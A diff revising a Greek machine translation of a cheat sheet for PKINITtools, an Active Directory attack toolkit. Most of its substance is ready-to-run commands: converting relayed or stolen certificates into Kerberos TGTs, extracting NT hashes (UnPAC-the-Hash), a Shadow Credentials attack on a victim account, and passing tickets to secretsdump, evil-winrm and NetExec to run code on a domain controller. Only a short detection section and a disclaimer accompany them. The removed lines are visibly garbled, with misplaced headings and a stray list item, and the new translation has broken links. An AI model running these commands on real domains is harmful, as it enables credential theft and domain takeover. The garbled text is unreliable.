@@ -1,12 +1,16 @@
-# 🎫 PKINITtools — Πλήρης οδηγός αναφοράς
-
 <!-- language-home-navigation -->
-[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🎫 PKINITtools - Πλήρες φύλλο εξαπάτησης
 
+[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
 ```
   ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
   ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
@@ -16,57 +20,55 @@
   ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
        Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
   <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
   <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
-  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="License MIT">
+  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="Άδεια MIT">
 </p>
 
 <p align="center">
-  <b>🌐 Tools for Kerberos Public Key Cryptography for Initial Authentication (PKINIT), converting certificates to TGT tickets and recovering NT hashes</b>
+  <b>🌐 Εργαλεία για κρυπτογραφία δημόσιου κλειδιού Kerberos για αρχικό έλεγχο ταυτότητας (PKINIT), μετατροπή πιστοποιητικών σε εισιτήρια TGT και ανάκτηση κατακερματισμών NT</b>
 </p>
 
 ---
 
 ## 📋 Πίνακας περιεχομένων
 
-- [Εισαγωγή](#-overview--the-pkinit-architecture)
+- [Overview & The PKINIT Architecture](#-overview--the-pkinit-architecture)
 - [Key Utilities: `gettgtpkinit.py` & `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
-- [Εγκατάσταση](#-installation)
-- [Converting AD CS Certificates to Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
-  - [Using a PFX File](#using-a-pfx-file)
-  - [When you obtain an Active Directory certificate via Certipy, Coercer, or NTLM Relay:](#using-base64-encoded-pfx-relay-chains)
-- [Recovering NT Hashes (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
+- [Εγκατάσταση] (#-εγκατάσταση)
+- [Μετατροπή πιστοποιητικών AD CS σε Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
+  - [Χρήση αρχείου PFX](#using-a-pfx-file)
+  - [Χρήση Base64-Encoded PFX (Relay Chains)](#using-base64-encoded-pfx-relay-chains)
+- [Ανάκτηση κατακερματισμών NT (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
 - [Shadow Credentials Attack Workflow](#-shadow-credentials-attack-workflow)
-- [Consuming the TGT with Impacket & NetExec](#-consuming-the-tgt-with-impacket--netexec)
-- [Γρήγορη αναφορά](#-quick-reference-table)
+- [Κατανάλωση του TGT με Impacket & NetExec](#-consuming-the-tgt-with-impacket--netexec)
+- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
 - [Defensive Considerations & Detection](#-defensive-considerations--detection)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
 
 ---
 
-## 🎯 Εισαγωγή
+## 🎯 Επισκόπηση & Αρχιτεκτονική PKINIT
 
-**PKINIT** (Public Key Cryptography for Initial Authentication in Kerberos, defined in **RFC 4556**) is an extension to the Kerberos protocol. Instead of requiring a user's secret password hash (NTLM or AES) to request a Kerberos Ticket Granting Ticket (TGT), PKINIT allows a client to prove identity using **X.509 digital certificates and private/public key pairs**.
+Το **PKINIT** (Κρυπτογραφία δημόσιου κλειδιού για αρχικό έλεγχο ταυτότητας στο Kerberos, που ορίζεται στο **RFC 4556**) είναι μια επέκταση του πρωτοκόλλου Kerberos. Αντί να απαιτείται ο κατακερματισμός μυστικού κωδικού πρόσβασης (NTLM ή AES) ενός χρήστη για να ζητήσει ένα εισιτήριο χορήγησης εισιτηρίων Kerberos (TGT), το PKINIT επιτρέπει σε έναν πελάτη να αποδείξει την ταυτότητα χρησιμοποιώντας **ψηφιακά πιστοποιητικά X.509 και ζεύγη ιδιωτικών/δημόσιων κλειδιών**.
 
-Created by renowned Active Directory researcher **Dirk-jan Mollema (@_dirkjan)**, **PKINITtools** provides the essential Python primitives to:
-1. Authenticate to Active Directory Domain Controllers via PKINIT using extracted or relayed digital certificates.
-🎯 Εισαγωγή
-3. Recover the cleartext **NTLM Hash** of the account via the **UnPAC-the-Hash** mechanism.
+Δημιουργήθηκε από τον διάσημο ερευνητή του Active Directory **Dirk-jan Mollema (@_dirkjan)**, το **PKINITtools** παρέχει τα βασικά primitives της Python για:
+1. Πραγματοποιήστε έλεγχο ταυτότητας σε ελεγκτές τομέα Active Directory μέσω PKINIT χρησιμοποιώντας εξαγόμενα ή αναμεταδομένα ψηφιακά πιστοποιητικά.
+2. Αποκτήστε ένα τυπικό αρχείο Kerberos TGT (`.ccache`).
+3. Ανακτήστε το καθαρό κείμενο **NTLM Hash** του λογαριασμού μέσω του μηχανισμού **UnPAC-the-Hash**.
 
 ---
 
-## 🧰 Key Utilities: `gettgtpkinit.py` & `getskeyhash.py`
+## 🧰 Βασικά βοηθητικά προγράμματα: `gettgtpkinit.py` & `getskeyhash.py`
 
-- **`gettgtpkinit.py`**: Communicates with the KDC (Kerberos Key Distribution Center) over port 88, presents the certificate, and requests an armored TGT, saving it as a Kirbi or ccache file.
-- **`getskeyhash.py`**: Interrogates the Kerberos PAC (Privilege Attribute Certificate) returned in the PKINIT ticket to calculate and expose the account's static NT hash.
+- **`gettgtpkinit.py`**: Επικοινωνεί με το KDC (Kerberos Key Distribution Center) μέσω της θύρας 88, παρουσιάζει το πιστοποιητικό και ζητά ένα θωρακισμένο TGT, αποθηκεύοντάς το ως αρχείο Kirbi ή ccache.
+- **`getskeyhash.py`**: Ανακρίνει το Kerberos PAC (Πιστοποιητικό Χαρακτηριστικού Προνομίου) που επιστράφηκε στο δελτίο PKINIT για να υπολογίσει και να αποκαλύψει τον στατικό κατακερματισμό NT του λογαριασμού.
 
 ---
 
 ## 📥 Εγκατάσταση
-
 ```bash
 # Clone GitHub repository
 git clone https://github.com/dirkjanm/PKINITtools.git
@@ -76,35 +78,29 @@ cd PKINITtools
 pip3 install -r requirements.txt
 pip3 install .
 ```
-
 ---
 
-## 🎫 Converting AD CS Certificates to Kerberos TGT
+## 🎫 Μετατροπή πιστοποιητικών AD CS σε Kerberos TGT
 
-When you obtain an Active Directory certificate via Certipy, Coercer, or NTLM Relay:
+Όταν αποκτάτε ένα πιστοποιητικό Active Directory μέσω Certipy, Coercer ή NTLM Relay:
 
-### Using a PFX File
-
+### Χρήση αρχείου PFX
 ```bash
 # Request TGT using a client certificate file (.pfx)
 gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
 ```
+### Χρήση PFX με κωδικοποίηση Base64 (αλυσίδες ρελέ)
 
-### When you obtain an Active Directory certificate via Certipy, Coercer, or NTLM Relay:
-
-Using a PFX File
-
+Συχνά, το `ntlmrelayx` εκτυπώνει πιστοποιητικά ως ακατέργαστη συμβολοσειρά base64 κατά τη διάρκεια επιθέσεων AD CS ESC8:
 ```bash
 # Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
 gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
 ```
-
 ---
 
-## 🔑 Recovering NT Hashes (UnPAC-the-Hash)
+## 🔑 Ανάκτηση NT Hashes (UnPAC-the-Hash)
 
-When an account authenticates with PKINIT, the Domain Controller signs the PAC with a PAC_CREDENTIAL_INFO structure containing the account's static **NTLM hash** (encrypted with a temporary AS-REP key). `getskeyhash.py` decrypts this structure:
-
+Όταν ένας λογαριασμός πραγματοποιεί έλεγχο ταυτότητας με το PKINIT, ο ελεγκτής τομέα υπογράφει το PAC με μια δομή PAC_CREDENTIAL_INFO που περιέχει το στατικό **NTLM hash** του λογαριασμού (κρυπτογραφημένο με ένα προσωρινό κλειδί AS-REP). Το `getskeyhash.py` αποκρυπτογραφεί αυτήν τη δομή:
 ```bash
 # Extract the NTLM hash directly from the ticket and KDC
 getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache
@@ -114,15 +110,13 @@ getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache
 # [*] Decrypted PAC_CREDENTIAL_INFO
 # [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 ```
-
-🔑 Recovering NT Hashes (UnPAC-the-Hash)
+Με το NT hash στο χέρι, μπορείτε να εκτελέσετε αμέσως **Pass-the-Hash** ή σπάσιμο εκτός σύνδεσης!
 
 ---
 
-## 👥 Shadow Credentials Attack Workflow
+## 👥 Ροή εργασιών επίθεσης Shadow Credentials
 
-With the NT hash in hand, you can immediately perform **Pass-the-Hash** or offline cracking!
-
+Όταν έχετε πρόσβαση εγγραφής σε ένα αντικείμενο Active Directory (`GenericAll`, `GenericWrite`, `WriteProperty` σε `msDS-KeyCredentialLink`):
 ```bash
 # 1. Use pyWhisker to inject a newly generated key credential into the victim object
 pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"
@@ -133,13 +127,11 @@ gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/Target
 # 3. Extract TargetUser's NT Hash
 getskeyhash.py corp.local/TargetUser target.ccache
 ```
-
 ---
 
-## 🚀 Consuming the TGT with Impacket & NetExec
+## 🚀 Καταναλώνοντας το TGT με Impacket & NetExec
 
-Once `gettgtpkinit.py` outputs a `.ccache` ticket, export it to the environment:
-
+Μόλις το `gettgtpkinit.py` εμφανίσει ένα εισιτήριο `.ccache`, εξάγετε το στο περιβάλλον:
 ```bash
 # Set Kerberos credential cache environment variable
 export KRB5CCNAME=/path/to/admin.ccache
@@ -153,30 +145,29 @@ evil-winrm -i dc01.corp.local -r corp.local
 # Execute commands using NetExec with Kerberos auth
 nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
 ```
-
 ---
 
-## ⚡ Γρήγορη αναφορά
+## ⚡ Γρήγορος Πίνακας Αναφοράς
 
-|Objective|Εντολή|
+| Στόχος | Εντολή |
 |-----------|---------|
-|**TGT via PFX File**|`gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>`|
-|**TGT via Base64 Cert**|`gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>`|
-|**Specify Domain Controller**|`gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>`|
-|**UnPAC-the-Hash (Get NTLM)**|`getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>`|
-|**Pass TGT to Impacket**|`export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>`|
-|**Pass TGT to NetExec**|`export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass`|
+| **TGT μέσω αρχείου PFX** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
+| **TGT μέσω Base64 Cert** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
+| **Καθορίστε τον ελεγκτή τομέα**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
+| **UnPAC-the-Hash (Λήψη NTLM)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
+| **Περάστε το TGT στο Impacket** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
+| **Περάστε το TGT στο NetExec** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |
 
 ---
 
-## 🛡️ Defensive Considerations & Detection
+## 🛡️ Αμυντικές Θεωρήσεις & Ανίχνευση
 
-1. **Event ID 4768 (TGT Request):** Active Directory logs Kerberos TGT requests. When PKINIT is used, the **Pre-Authentication Type** field shows `16` (PKINIT), rather than `2` (PA-ENC-TIMESTAMP).
-2. **Auditing `msDS-KeyCredentialLink` Modifications:** Event ID 5136 records directory object modifications. Alert when key credentials are appended to non-Azure/Intune managed accounts.
+1. **Αναγνωριστικό συμβάντος 4768 (Αίτημα TGT):** Η υπηρεσία καταλόγου Active Directory καταγράφει αιτήματα Kerberos TGT. Όταν χρησιμοποιείται το PKINIT, το πεδίο **Τύπος Προ-Επαλήθευσης** εμφανίζει `16` (PKINIT) αντί για `2` (PA-ENC-TIMESTAMP).
+2. **Έλεγχος Τροποποιήσεων `msDS-KeyCredentialLink`:** Το Αναγνωριστικό συμβάντος 5136 καταγράφει τις τροποποιήσεις αντικειμένων καταλόγου. Ειδοποίηση όταν τα βασικά διαπιστευτήρια προστίθενται σε λογαριασμούς που δεν διαχειρίζονται Azure/Intune.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Νομική αποποίηση ευθύνης
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> PKINITtools is intended for authorized Active Directory security auditing, Red Team operations, and educational research only. Manipulating corporate Kerberos tickets without explicit permission is illegal.
+> [!ΠΡΟΣΟΧΗ]
+> Το PKINITtools προορίζεται μόνο για εξουσιοδοτημένο έλεγχο ασφαλείας Active Directory, λειτουργίες Red Team και εκπαιδευτική έρευνα. Η χειραγώγηση εταιρικών εισιτηρίων Kerberos χωρίς ρητή άδεια είναι παράνομη.
